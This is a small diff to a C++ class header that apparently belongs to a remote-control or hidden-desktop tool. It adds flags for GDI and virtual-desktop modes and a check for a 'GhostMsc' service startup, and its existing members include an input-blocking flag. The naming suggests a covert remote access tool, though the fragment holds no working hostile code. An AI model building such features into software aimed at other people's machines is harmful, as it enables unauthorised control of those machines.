@@ -39,6 +39,7 @@ public:
     VOID ProcessCommand(LPBYTE szBuffer, ULONG ulLength);
     INT_PTR m_ptrUser;
     HDESK g_hDesk;
+    BOOL m_isGDI;
     std::string m_DesktopID;
     BOOL  m_bIsWorking;
     BOOL  m_bIsBlockInput;
@@ -52,7 +53,11 @@ public:
     {
         m_conn = conn;
     }
+    bool IsRunAsService() const {
+        return m_conn ? m_conn->iStartup == Startup_GhostMsc : false;
+    }
     // ÐéÄâ×ÀÃæ
+    BOOL                m_virtual;
     POINT               m_point;
     POINT               m_lastPoint;
     BOOL                m_lmouseDown;
